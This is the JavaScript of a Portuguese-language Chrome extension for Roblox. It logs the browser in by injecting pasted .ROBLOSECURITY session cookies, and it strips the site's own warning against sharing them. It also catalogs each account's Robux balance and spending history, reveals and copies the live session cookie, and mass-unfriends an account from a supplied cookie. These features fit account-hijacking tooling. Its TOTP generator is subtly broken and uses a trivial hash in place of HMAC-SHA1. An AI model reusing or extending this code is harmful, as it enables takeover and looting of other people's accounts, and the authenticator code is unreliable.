document.addEventListener('DOMContentLoaded', function() {

    // ── DOM ──
    const navBtns           = document.querySelectorAll('.nav-btn');
    const tabContents       = document.querySelectorAll('.tab-content');
    const loginForm         = document.getElementById('loginForm');
    const accessForm        = document.getElementById('accessForm');
    const friendsForm       = document.getElementById('friendsForm');
    const authForm          = document.getElementById('authForm');
    const backBtn           = document.getElementById('backBtn');
    const getCookieBtn      = document.getElementById('getCookieBtn');
    const profileView       = document.getElementById('profileView');
    const loginCard         = document.querySelector('#loginTab .card');
    const friendsSubmitBtn  = document.getElementById('friendsSubmitBtn');
    const friendsProgress   = document.getElementById('friendsProgress');
    const fpCount           = document.getElementById('fpCount');
    const fpLabel           = document.getElementById('fpLabel');
    const fpBar             = document.getElementById('fpBar');
    const accountsList      = document.getElementById('accountsList');
    const accountsCountBadge = document.getElementById('accountsCountBadge');
    const clearAccountsBtn  = document.getElementById('clearAccountsBtn');

    let currentCookie = '';
    let removingFriends = false;

    // ── NAV ──
    navBtns.forEach(btn => {
        btn.addEventListener('click', () => {
            switchTab(btn.getAttribute('data-tab'));
        });
    });

    function switchTab(tabName) {
        tabContents.forEach(t => t.classList.remove('active'));
        navBtns.forEach(b => b.classList.remove('active'));
        document.getElementById(tabName + 'Tab').classList.add('active');
        document.querySelector(`[data-tab="${tabName}"]`).classList.add('active');

        if (tabName !== 'login') {
            profileView.style.display = 'none';
            loginCard.style.display = 'block';
        }

        if (tabName === 'accounts') {
            renderAccounts();
        }

        if (tabName === 'robux') {
            startRobuxTracker();
        }
    }

    // ── ALERTS ──
    function showAlert(message, type, alertId) {
        const alertDiv = document.createElement('div');
        alertDiv.className = `alert alert-${type}`;
        const icon = type === 'success' ? 'check-circle'
                   : type === 'error'   ? 'exclamation-circle'
                   : type === 'warning' ? 'exclamation-triangle'
                   : 'info-circle';
        alertDiv.innerHTML = `<div class="alert-main"><i class="fas fa-${icon}"></i> ${message}</div>`;
        const alertContainer = document.getElementById(alertId);
        alertContainer.innerHTML = '';
        alertContainer.appendChild(alertDiv);
    }

    function showLogin() {
        loginCard.style.display = 'block';
        profileView.style.display = 'none';
        document.getElementById('login-alert').innerHTML = '';
        document.getElementById('cookie').value = '';
    }

    // ── AVATAR ──
    function getAvatarUrl(userId) {
        return fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png`)
            .then(r => r.json())
            .then(json => {
                if (json.data && json.data.length && json.data[0].imageUrl) return json.data[0].imageUrl;
                return 'https://tr.rbxcdn.com/f401f3ae246e8cec456b69134f83ea67/420/420/AvatarHeadshot/Png';
            })
            .catch(() => 'https://tr.rbxcdn.com/f401f3ae246e8cec456b69134f83ea67/420/420/AvatarHeadshot/Png');
    }

    // ── ROBUX BALANCE ──
    async function getRobux(userId) {
        try {
            const res = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { credentials: 'include' });
            const data = await res.json();
            return data.robux !== undefined ? String(data.robux) : '0';
        } catch (e) { return '0'; }
    }

    // ── USER PROFILE ──
    function getUserProfile(id) {
        return fetch(`https://users.roblox.com/v1/users/${id}`)
            .then(r => r.json())
            .catch(() => ({}));
    }

    // ── SHOW USER INFO + SAVE ACCOUNT ──
    async function showUserInfo(user) {
        const profile   = await getUserProfile(user.id);
        const avatarUrl = await getAvatarUrl(user.id);
        const robux     = await getRobux(user.id);

        const idStr    = user.id   ? String(user.id)   : '';
        const nameStr  = user.name ? String(user.name) : '';
        const createdRaw  = profile && profile.created ? profile.created : '';
        const createdText = createdRaw ? new Date(createdRaw).toLocaleDateString('pt-BR') : 'Não fornecida';
        const daysSince   = createdRaw
            ? Math.floor((Date.now() - new Date(createdRaw).getTime()) / (1000 * 60 * 60 * 24))
            : 'N/A';

        document.getElementById('userAvatar').src           = avatarUrl;
        document.getElementById('userName').textContent     = nameStr;
        document.getElementById('userId').textContent       = idStr;
        document.getElementById('userCreated').textContent  = createdText;
        document.getElementById('daysSince').textContent    = daysSince;
        document.getElementById('userRobux').textContent    = robux;
        document.getElementById('userSpent').textContent    = 'Analisando...';

        loginCard.style.display   = 'none';
        profileView.style.display = 'block';

        // Save basic account info first
        const accountData = {
            id: idStr,
            name: nameStr,
            avatarUrl,
            robux,
            createdText,
            loginDate: new Date().toLocaleDateString('pt-BR'),
            totalSpent: null,
            topItems: null
        };
        saveAccount(accountData);

        // Fetch spending data in background
        fetchRobuxSpendingForAccount(idStr, user.id);

        setTimeout(() => {
            chrome.tabs.create({ url: 'https://www.roblox.com/my/account#!/info' });
        }, 2000);
    }

    // ──────────────────────────────────────────
    //  ROBUX SPENDING ANALYSIS (background)
    // ──────────────────────────────────────────

    async function fetchRobuxSpendingForAccount(accountIdStr, numericUserId) {
        try {
            const transactions = await robuxFetchAllTransactions(numericUserId, () => {});
            if (transactions.length === 0) {
                updateAccountSpending(accountIdStr, 0, []);
                return;
            }
            const total = transactions.reduce((sum, t) => sum + t.amount, 0);
            const sorted = [...transactions].sort((a, b) => b.amount - a.amount);
            const topItems = sorted.slice(0, 5).map(t => ({ name: t.name, amount: t.amount }));
            updateAccountSpending(accountIdStr, total, topItems);

            // Update the "Total Gasto" row on the login profile view if still visible
            const spentEl = document.getElementById('userSpent');
            if (spentEl) {
                spentEl.textContent = total.toLocaleString('pt-BR') + ' Robux';
            }
        } catch (e) {
            // Silently fail - spending data just won't be available
            const spentEl = document.getElementById('userSpent');
            if (spentEl) spentEl.textContent = 'Indisponível';
        }
    }

    function updateAccountSpending(accountIdStr, total, topItems) {
        loadAccounts(function(accounts) {
            const idx = accounts.findIndex(a => a.id === accountIdStr);
            if (idx !== -1) {
                accounts[idx].totalSpent = total;
                accounts[idx].topItems   = topItems;
                chrome.storage.local.set({ savedAccounts: accounts }, function() {
                    // Re-render accounts if tab is active
                    const accountsTab = document.getElementById('accountsTab');
                    if (accountsTab && accountsTab.classList.contains('active')) {
                        renderAccounts();
                    }
                });
            }
        });
    }

    // ──────────────────────────────────────────
    //  ACCOUNTS STORAGE
    // ──────────────────────────────────────────

    function loadAccounts(cb) {
        chrome.storage.local.get(['savedAccounts'], function(result) {
            cb(result.savedAccounts || []);
        });
    }

    function saveAccount(account) {
        loadAccounts(function(accounts) {
            const idx = accounts.findIndex(a => a.id === account.id);
            if (idx !== -1) {
                // Preserve spending data if already analyzed
                const existing = accounts[idx];
                accounts[idx] = {
                    ...account,
                    totalSpent: existing.totalSpent !== undefined ? existing.totalSpent : account.totalSpent,
                    topItems:   existing.topItems   !== undefined ? existing.topItems   : account.topItems
                };
            } else {
                accounts.unshift(account);
            }
            if (accounts.length > 50) accounts = accounts.slice(0, 50);
            chrome.storage.local.set({ savedAccounts: accounts });
        });
    }

    function removeAccount(accountId) {
        loadAccounts(function(accounts) {
            const updated = accounts.filter(a => a.id !== accountId);
            chrome.storage.local.set({ savedAccounts: updated }, function() {
                renderAccounts();
            });
        });
    }

    function escHtml(str) {
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;');
    }

    function renderAccounts() {
        loadAccounts(function(accounts) {
            accountsCountBadge.textContent = accounts.length === 1 ? '1 conta' : `${accounts.length} contas`;

            if (accounts.length === 0) {
                accountsList.innerHTML = `
                    <div class="empty-state">
                        <div class="empty-state-icon"><i class="fas fa-user-circle"></i></div>
                        <div class="empty-state-title">Nenhuma conta salva</div>
                        <div class="empty-state-text">Faça login com um cookie para registrar uma conta aqui.</div>
                    </div>`;
                clearAccountsBtn.style.display = 'none';
                return;
            }

            clearAccountsBtn.style.display = 'flex';
            accountsList.innerHTML = '';

            accounts.forEach(function(acc) {
                const item = document.createElement('div');
                item.className = 'account-item';

                // Robux spent display
                let spentHtml = '';
                if (acc.totalSpent === null || acc.totalSpent === undefined) {
                    spentHtml = `<div class="account-spent-loading"><i class="fas fa-spinner fa-spin" style="font-size:9px;"></i> Analisando gastos...</div>`;
                } else {
                    spentHtml = `<div class="account-spent"><i class="fas fa-arrow-down" style="font-size:9px;"></i> Gasto: ${acc.totalSpent.toLocaleString('pt-BR')} Robux</div>`;
                }

                // Top items panel
                let topItemsHtml = '';
                if (acc.topItems && acc.topItems.length > 0) {
                    const rows = acc.topItems.map((it, i) => {
                        const rankCls = i === 0 ? 'gold' : i === 1 ? 'silver' : i === 2 ? 'bronze' : '';
                        return `
                            <div class="top-item-row">
                                <span class="top-item-rank ${rankCls}">#${i + 1}</span>
                                <span class="top-item-name" title="${escHtml(it.name)}">${escHtml(it.name)}</span>
                                <span class="top-item-amount">
                                    <svg class="top-item-robux-icon" viewBox="0 0 16 16" fill="none"><path d="M4 12L6 4H12L10 12H4Z" fill="#22c55e"/></svg>
                                    ${it.amount.toLocaleString('pt-BR')}
                                </span>
                            </div>`;
                    }).join('');
                    topItemsHtml = `
                        <div class="account-top-items" id="top-items-${acc.id}">
                            <div class="top-items-title">🏆 Top Itens mais caros</div>
                            ${rows}
                        </div>`;
                } else if (acc.topItems !== null && acc.topItems !== undefined && acc.topItems.length === 0) {
                    topItemsHtml = `
                        <div class="account-top-items" id="top-items-${acc.id}">
                            <div class="top-items-analyzing" style="color:var(--text-sec);">Nenhuma compra encontrada.</div>
                        </div>`;
                } else if (acc.totalSpent === null || acc.totalSpent === undefined) {
                    topItemsHtml = `
                        <div class="account-top-items" id="top-items-${acc.id}">
                            <div class="top-items-analyzing"><i class="fas fa-spinner fa-spin"></i> Analisando transações...</div>
                        </div>`;
                }

                const hasTopBtn = topItemsHtml !== '';

                item.innerHTML = `
                    <div class="account-item-main">
                        <img class="account-avatar" src="${escHtml(acc.avatarUrl)}" alt="${escHtml(acc.name)}" />
                        <div class="account-info">
                            <div class="account-name">${escHtml(acc.name)}</div>
                            <div class="account-meta">ID: ${escHtml(acc.id)}</div>
                            <div class="account-robux"><i class="fas fa-coins"></i> ${escHtml(acc.robux)} Robux</div>
                            ${spentHtml}
                            <span class="logged-in-tag">LOGIN ${escHtml(acc.loginDate || '')}</span>
                        </div>
                        <div class="account-actions">
                            ${hasTopBtn ? `<button class="btn-icon btn-icon-amber toggle-top-btn" title="Ver Top Itens" data-id="${escHtml(acc.id)}"><i class="fas fa-chart-bar"></i></button>` : ''}
                            <button class="btn-icon btn-icon-red remove-acc-btn" title="Remover do histórico" data-id="${escHtml(acc.id)}">
                                <i class="fas fa-trash"></i>
                            </button>
                        </div>
                    </div>
                    ${topItemsHtml}`;

                accountsList.appendChild(item);
            });

            // Toggle top items panel
            accountsList.querySelectorAll('.toggle-top-btn').forEach(function(btn) {
                btn.addEventListener('click', function() {
                    const id = btn.getAttribute('data-id');
                    const panel = document.getElementById('top-items-' + id);
                    if (panel) {
                        panel.classList.toggle('open');
                        const icon = btn.querySelector('i');
                        if (panel.classList.contains('open')) {
                            icon.className = 'fas fa-chevron-up';
                        } else {
                            icon.className = 'fas fa-chart-bar';
                        }
                    }
                });
            });

            // Remove individual account
            accountsList.querySelectorAll('.remove-acc-btn').forEach(function(btn) {
                btn.addEventListener('click', function() {
                    removeAccount(btn.getAttribute('data-id'));
                });
            });
        });
    }

    // Clear all accounts
    clearAccountsBtn.addEventListener('click', function() {
        chrome.storage.local.set({ savedAccounts: [] }, function() {
            renderAccounts();
        });
    });

    // ──────────────────────────────────────────
    //  COOKIE LOGIN
    // ──────────────────────────────────────────

    function setRobloxCookie(cookieValue) {
        chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' }, function(oldCookie) {
            chrome.cookies.set({
                url: 'https://www.roblox.com/',
                name: '.ROBLOSECURITY',
                value: cookieValue,
                domain: '.roblox.com',
                path: '/',
                secure: true,
                httpOnly: true,
                sameSite: 'no_restriction'
            }, function() {
                fetchUserData(oldCookie, cookieValue);
            });
        });
    }

    function fetchUserData(oldCookie, cookieValue) {
        fetch("https://users.roblox.com/v1/users/authenticated", { credentials: 'include' })
        .then(response => {
            if (!response.ok) throw new Error('Não autenticado. Cookie inválido?');
            return response.json();
        })
        .then(data => {
            currentCookie = cookieValue;
            showAlert('Sucesso! Sua sessão foi iniciada.', 'success', 'login-alert');
            showUserInfo(data);
        })
        .catch(err => {
            if (oldCookie) {
                chrome.cookies.set({
                    url: 'https://www.roblox.com/',
                    name: '.ROBLOSECURITY',
                    value: oldCookie.value,
                    domain: '.roblox.com',
                    path: '/',
                    secure: true,
                    httpOnly: true,
                    sameSite: 'no_restriction'
                });
            }
            showAlert('Cookie inválido ou incorreto.', 'error', 'login-alert');
        });
    }

    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        let rawValue = document.getElementById('cookie').value;
        let cleaned  = rawValue.replace(/[`"'\s\r\n\t*]/g, '');

        const warningTag = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
        let cookieValue = '';

        if (cleaned.includes(warningTag)) {
            cookieValue = cleaned.split(warningTag)[1];
        } else {
            let match = cleaned.match(/CAE[A-Z0-9._-]{100,}/i) || cleaned.match(/[A-Z0-9._-]{100,}/i);
            cookieValue = match ? match[0] : cleaned;
        }

        cookieValue = cookieValue.replace(/[^A-Z0-9._-]+/i, '').replace(/_+$/, '');

        if (!cookieValue || cookieValue.length < 50) {
            showAlert('Cookie inválido ou muito curto.', 'error', 'login-alert');
            return;
        }

        setRobloxCookie(cookieValue);
    });

    backBtn.addEventListener('click', showLogin);

    // ──────────────────────────────────────────
    //  COOKIE ACCESS
    // ──────────────────────────────────────────

    getCookieBtn.addEventListener('click', function() {
        const cookieInput = document.getElementById('accessCookie');

        if (cookieInput.type === 'text') {
            cookieInput.type  = 'password';
            cookieInput.value = '';
            getCookieBtn.innerHTML = '<i class="fas fa-eye"></i> Mostrar Cookie';
            return;
        }

        chrome.cookies.get({ url: 'https://www.roblox.com/', name: '.ROBLOSECURITY' }, function(cookie) {
            if (!cookie) {
                showAlert('Não há uma sessão ativa.', 'error', 'access-alert');
                return;
            }

            fetch("https://users.roblox.com/v1/users/authenticated", { credentials: 'include' })
            .then(r => { if (!r.ok) throw new Error(); return r.json(); })
            .then(() => {
                cookieInput.type  = 'text';
                cookieInput.value = cookie.value;
                getCookieBtn.innerHTML = '<i class="fas fa-eye-slash"></i> Ocultar Cookie';
                cookieInput.select();
                document.execCommand('copy');
                showAlert('Cookie copiado para a área de transferência!', 'success', 'access-alert');
            })
            .catch(() => {
                showAlert('Não há uma sessão ativa.', 'error', 'access-alert');
            });
        });
    });

    // ──────────────────────────────────────────
    //  CSRF TOKEN
    // ──────────────────────────────────────────

    async function getCsrfToken() {
        try {
            const res = await fetch("https://auth.roblox.com/v1/logout", {
                method: 'POST',
                credentials: 'include'
            });
            const token = res.headers.get('x-csrf-token');
            if (token) return token;
            throw new Error('Token não encontrado no header');
        } catch (e) {
            return null;
        }
    }

    // ──────────────────────────────────────────
    //  REMOVE FRIENDS  (loop até zerar)
    // ──────────────────────────────────────────

    friendsForm.addEventListener('submit', async function(e) {
        e.preventDefault();

        if (removingFriends) return;

        const friendsCookie = document.getElementById('friendsCookie').value.trim();

        if (!friendsCookie || friendsCookie.length < 50) {
            showAlert('Cookie inválido.', 'error', 'friends-alert');
            return;
        }

        removingFriends = true;
        friendsSubmitBtn.disabled = true;
        friendsSubmitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Removendo...';

        friendsProgress.classList.add('active');
        fpCount.textContent = '0';
        fpLabel.textContent = 'amigos removidos...';
        fpBar.style.width   = '5%';

        showAlert('Iniciando... aguarde.', 'info', 'friends-alert');

        try {
            await new Promise((resolve, reject) => {
                chrome.cookies.set({
                    url: 'https://www.roblox.com/',
                    name: '.ROBLOSECURITY',
                    value: friendsCookie,
                    domain: '.roblox.com',
                    path: '/',
                    secure: true,
                    httpOnly: true,
                    sameSite: 'no_restriction'
                }, function(c) { if (c) resolve(); else reject(new Error('Erro ao definir cookie')); });
            });

            const authRes = await fetch("https://users.roblox.com/v1/users/authenticated", { credentials: 'include' });
            if (!authRes.ok) throw new Error('Cookie inválido ou sessão expirada.');
            const user = await authRes.json();

            let totalRemoved = 0;
            let round = 0;

            while (true) {
                round++;
                const csrfToken = await getCsrfToken();
                if (!csrfToken) throw new Error('Não foi possível obter o token CSRF. Tente novamente.');

                const friendsRes = await fetch(
                    `https://friends.roblox.com/v1/users/${user.id}/friends?limit=200`,
                    { credentials: 'include' }
                );

                if (!friendsRes.ok) {
                    await sleep(3000);
                    continue;
                }

                const friendsData = await friendsRes.json();
                const friends = friendsData.data || [];

                if (friends.length === 0) break;

                showAlert(
                    `Rodada ${round}: ${friends.length} amigo(s) encontrado(s). Total removido: ${totalRemoved}`,
                    'info', 'friends-alert'
                );

                for (const friend of friends) {
                    try {
                        const delRes = await fetch(
                            `https://friends.roblox.com/v1/users/${friend.id}/unfriend`,
                            {
                                method: 'POST',
                                headers: {
                                    'X-CSRF-TOKEN': csrfToken,
                                    'Content-Type': 'application/json'
                                },
                                credentials: 'include'
                            }
                        );

                        if (delRes.status === 403) break;

                        if (delRes.ok) {
                            totalRemoved++;
                            fpCount.textContent = totalRemoved;
                            fpBar.style.width = Math.min(5 + (totalRemoved * 2), 95) + '%';
                        }

                        await sleep(150);
                    } catch (innerErr) {
                        await sleep(300);
                    }
                }

                await sleep(800);
            }

            fpBar.style.width = '100%';
            fpBar.style.animation = 'none';
            fpBar.style.background = '#10b981';
            fpLabel.textContent = 'amigos removidos com sucesso!';
            showAlert(`✅ Concluído! ${totalRemoved} amigo(s) removido(s) no total.`, 'success', 'friends-alert');
            document.getElementById('friendsCookie').value = '';

        } catch (err) {
            showAlert('Erro: ' + err.message, 'error', 'friends-alert');
        } finally {
            removingFriends = false;
            friendsSubmitBtn.disabled = false;
            friendsSubmitBtn.innerHTML = '<i class="fas fa-trash"></i> Remover Todos os Amigos';
        }
    });

    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // ──────────────────────────────────────────
    //  AUTH AUTHENTICATOR (TOTP)
    // ──────────────────────────────────────────

    function updateAuthCode() {
        const secret = document.getElementById('authSecret').value.trim();
        if (!secret) return;
        try {
            const code  = generateTOTP(secret);
            document.getElementById('codeValue').textContent = code;
            document.getElementById('authCode').style.display = 'block';

            const now = Math.floor(Date.now() / 1000);
            const secondsRemaining = 30 - (now % 30);
            const percentage = (secondsRemaining / 30) * 100;
            const progressBar = document.getElementById('authProgress');
            if (progressBar) {
                progressBar.style.width      = percentage + '%';
                progressBar.style.background = secondsRemaining <= 5 ? 'var(--danger)' : 'var(--success)';
            }
        } catch (e) {}
    }

    chrome.storage.local.get(['authSecret'], function(result) {
        if (result.authSecret) {
            document.getElementById('authSecret').value = result.authSecret;
            updateAuthCode();
        }
    });

    setInterval(updateAuthCode, 1000);

    function generateTOTP(secret) {
        const base32Chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
        let bits = '';
        for (let i = 0; i < secret.length; i++) {
            const val = base32Chars.indexOf(secret[i].toUpperCase());
            if (val === -1) throw new Error('Caractere inválido no secret');
            bits += val.toString(2).padStart(5, '0');
        }
        const bytes = [];
        for (let i = 0; i < bits.length; i += 8) bytes.push(parseInt(bits.substr(i, 8), 2));

        const now = Math.floor(Date.now() / 1000);
        let counter = Math.floor(now / 30);
        const counterBytes = [];
        for (let i = 7; i >= 0; i--) {
            counterBytes[i] = counter & 0xff;
            counter >>>= 8;
        }
        return generateHMACSHA1(bytes, counterBytes);
    }

    function generateHMACSHA1(key, message) {
        let hash = 0;
        for (let i = 0; i < key.length;     i++) { hash = ((hash << 5) - hash) + key[i];     hash = hash & hash; }
        for (let i = 0; i < message.length; i++) { hash = ((hash << 5) - hash) + message[i]; hash = hash & hash; }
        return String(Math.abs(hash) % 1000000).padStart(6, '0');
    }

    authForm.addEventListener('submit', function(e) {
        e.preventDefault();
        const secret = document.getElementById('authSecret').value.trim();
        if (!secret) { showAlert('Por favor, insira o secret.', 'error', 'auth-alert'); return; }
        try {
            const code = generateTOTP(secret);
            document.getElementById('codeValue').textContent    = code;
            document.getElementById('authCode').style.display   = 'block';
            chrome.storage.local.set({ authSecret: secret });
            showAlert('Código gerado com sucesso!', 'success', 'auth-alert');
        } catch (err) {
            showAlert('Erro ao gerar código: ' + err.message, 'error', 'auth-alert');
        }
    });

    // ──────────────────────────────────────────
    //  ROBUX TRACKER CORE (shared by tab + accounts)
    // ──────────────────────────────────────────

    const ROBUX_SVG = `<svg class="robux-icon-small" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 12L6 4H12L10 12H4Z" fill="#22c55e"/></svg>`;
    const ROBUX_SVG_BIG = `<svg class="robux-icon-big" viewBox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M4 12L6 4H12L10 12H4Z" fill="#22c55e"/></svg>`;

    async function robuxFetchWithRetry(url, maxRetries = 5) {
        let attempt = 0;
        while (true) {
            const response = await fetch(url, {
                credentials: 'include',
                headers: { 'Accept': 'application/json' }
            });

            if (response.status === 429) {
                attempt++;
                if (attempt > maxRetries) throw new Error('RATE_LIMIT');
                const waitSec = Math.min(5 * attempt, 30);
                for (let i = waitSec; i > 0; i--) {
                    const pt = document.getElementById('robux-progress-text');
                    if (pt) pt.textContent = `Rate limit — aguardando (${i}s)`;
                    await sleep(1000);
                }
                continue;
            }

            if (response.status === 401 || response.status === 403) throw new Error('AUTH_ERROR');
            if (!response.ok) throw new Error(`HTTP ${response.status}`);

            return response.json();
        }
    }

    async function robuxFetchAllTransactions(userId, onProgress) {
        const transactions = [];
        let cursor = '';
        let page = 0;
        const limit = 100;

        while (true) {
            page++;
            const url = `https://economy.roblox.com/v2/users/${userId}/transactions?transactionType=Purchase&limit=${limit}${cursor ? '&cursor=' + cursor : ''}`;
            const data = await robuxFetchWithRetry(url);

            const items = data.data || [];
            for (const item of items) {
                const amount = item.currency?.amount;
                const name = item.details?.name || item.description || 'Item desconhecido';
                if (amount && Math.abs(amount) > 0) {
                    transactions.push({ name, amount: Math.abs(amount) });
                }
            }

            cursor = data.nextPageCursor;
            onProgress(page, transactions.length, !!cursor);
            if (!cursor) break;
            await sleep(600);
        }

        return transactions;
    }

    // ──────────────────────────────────────────
    //  ROBUX TAB
    // ──────────────────────────────────────────

    let robuxTrackerRunning = false;

    function robuxSetStatus(msg, pct, sub) {
        const statusEl   = document.getElementById('robux-status');
        const statusText = document.getElementById('robux-status-text');
        const pb         = document.getElementById('robux-progress-bar');
        const pt         = document.getElementById('robux-progress-text');
        if (statusEl)   statusEl.style.display = 'flex';
        if (statusText) statusText.textContent  = msg;
        if (pct !== undefined && pb) pb.style.width = pct + '%';
        if (sub !== undefined && pt) pt.textContent = sub;
    }

    function robuxShowError(msg, showLoginBtn) {
        const statusEl  = document.getElementById('robux-status');
        const resultsEl = document.getElementById('robux-results');
        if (statusEl)  statusEl.style.display  = 'none';
        if (resultsEl) {
            resultsEl.style.display = 'block';
            let html = `<div class="robux-error-box">${msg}</div>`;
            if (showLoginBtn) {
                html += `<a class="robux-login-btn" href="https://www.roblox.com/login" target="_blank">Ir para o Login</a>`;
            }
            resultsEl.innerHTML = html;
        }
        robuxTrackerRunning = false;
    }

    function robuxRenderResults(transactions) {
        const statusEl  = document.getElementById('robux-status');
        const resultsEl = document.getElementById('robux-results');

        const total  = transactions.reduce((sum, t) => sum + t.amount, 0);
        const sorted = [...transactions].sort((a, b) => b.amount - a.amount);
        const top    = sorted.slice(0, 10);

        const rankClass = i => i === 0 ? 'gold' : i === 1 ? 'silver' : i === 2 ? 'bronze' : '';

        const itemRows = top.map((item, i) => `
            <div class="robux-item-row">
                <span class="robux-item-rank ${rankClass(i)}">#${i + 1}</span>
                <span class="robux-item-name" title="${escHtml(item.name)}">${escHtml(item.name)}</span>
                <span class="robux-item-amount">${ROBUX_SVG} ${item.amount.toLocaleString('pt-BR')}</span>
            </div>
        `).join('');

        if (statusEl)  statusEl.style.display  = 'none';
        if (resultsEl) {
            resultsEl.style.display = 'block';
            resultsEl.innerHTML = `
                <div class="robux-total-card">
                    <div class="robux-total-label">Total gasto em Robux</div>
                    <div class="robux-total-value">${ROBUX_SVG_BIG} ${total.toLocaleString('pt-BR')}</div>
                    <div class="robux-total-count">${transactions.length} compras analisadas</div>
                </div>
                ${top.length > 0 ? `
                    <div class="robux-section-title">🏆 Itens mais caros</div>
                    <div class="robux-item-list">${itemRows}</div>
                ` : ''}
                <button class="robux-refresh-btn" id="robux-refresh-btn">↺ Atualizar</button>
            `;

            document.getElementById('robux-refresh-btn').addEventListener('click', () => {
                resultsEl.style.display = 'none';
                const se = document.getElementById('robux-status');
                if (se) se.style.display = 'flex';
                const pb = document.getElementById('robux-progress-bar');
                if (pb) pb.style.width = '0%';
                const pt = document.getElementById('robux-progress-text');
                if (pt) pt.textContent = '';
                robuxTrackerRunning = false;
                startRobuxTracker();
            });
        }

        robuxTrackerRunning = false;
    }

    async function startRobuxTracker() {
        if (robuxTrackerRunning) return;
        robuxTrackerRunning = true;

        const statusEl  = document.getElementById('robux-status');
        const resultsEl = document.getElementById('robux-results');
        if (statusEl)  statusEl.style.display  = 'flex';
        if (resultsEl) resultsEl.style.display  = 'none';

        robuxSetStatus('Verificando login...', 5, '');

        let userId;
        try {
            const data = await robuxFetchWithRetry('https://users.roblox.com/v1/users/authenticated');
            userId = data.id;
        } catch (e) {
            if (e.message === 'AUTH_ERROR') {
                robuxShowError('Você precisa estar logado no Roblox.<br>Abra o roblox.com e faça login, depois volte aqui.', true);
                return;
            }
            const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
            if (tab && tab.url && tab.url.includes('roblox.com')) {
                try {
                    const results = await chrome.scripting.executeScript({
                        target: { tabId: tab.id },
                        func: () => {
                            const scripts = document.querySelectorAll('script');
                            for (const s of scripts) {
                                const m1 = s.textContent.match(/"UserId"\s*:\s*(\d+)/);
                                if (m1) return m1[1];
                                const m2 = s.textContent.match(/userId['":\s]+(\d+)/i);
                                if (m2) return m2[1];
                            }
                            const profileLink = document.querySelector('a[href*="/users/"][href*="/profile"]');
                            if (profileLink) {
                                const m = profileLink.href.match(/\/users\/(\d+)\//);
                                if (m) return m[1];
                            }
                            const navEl = document.querySelector('[data-userid]');
                            if (navEl) return navEl.getAttribute('data-userid');
                            return null;
                        }
                    });
                    userId = results?.[0]?.result || null;
                } catch (e2) { userId = null; }
            }
        }

        if (!userId) {
            robuxShowError('Você precisa estar logado no Roblox.<br>Abra o roblox.com e faça login, depois volte aqui.', true);
            return;
        }

        robuxSetStatus('Buscando transações...', 15, 'Iniciando...');

        let transactions;
        try {
            transactions = await robuxFetchAllTransactions(userId, (page, count, hasMore) => {
                const pct = hasMore ? Math.min(15 + page * 4, 88) : 92;
                robuxSetStatus(
                    'Buscando transações...',
                    pct,
                    `Página ${page} — ${count} itens${hasMore ? '...' : ' ✓'}`
                );
            });
        } catch (e) {
            if (e.message === 'AUTH_ERROR') {
                robuxShowError('Sem permissão para acessar as transações.<br>Certifique-se de estar logado no Roblox.', true);
            } else if (e.message === 'RATE_LIMIT') {
                robuxShowError('O Roblox bloqueou temporariamente as requisições.<br>Aguarde alguns minutos e tente novamente.');
            } else {
                robuxShowError(`Erro inesperado:<br>${e.message}`);
            }
            return;
        }

        robuxSetStatus('Calculando...', 97, 'Quase pronto!');
        await sleep(200);

        if (transactions.length === 0) {
            if (statusEl)  statusEl.style.display  = 'none';
            if (resultsEl) {
                resultsEl.style.display = 'block';
                resultsEl.innerHTML = `
                    <div class="robux-error-box" style="color:var(--text-sec);border-color:rgba(255,255,255,0.08);background:rgba(255,255,255,0.03)">
                        Nenhuma compra encontrada.<br>
                        <small>Certifique-se de ter feito compras com Robux.</small>
                    </div>
                `;
            }
            robuxTrackerRunning = false;
            return;
        }

        robuxRenderResults(transactions);
    }

    // ── INIT ──
    showLogin();
});
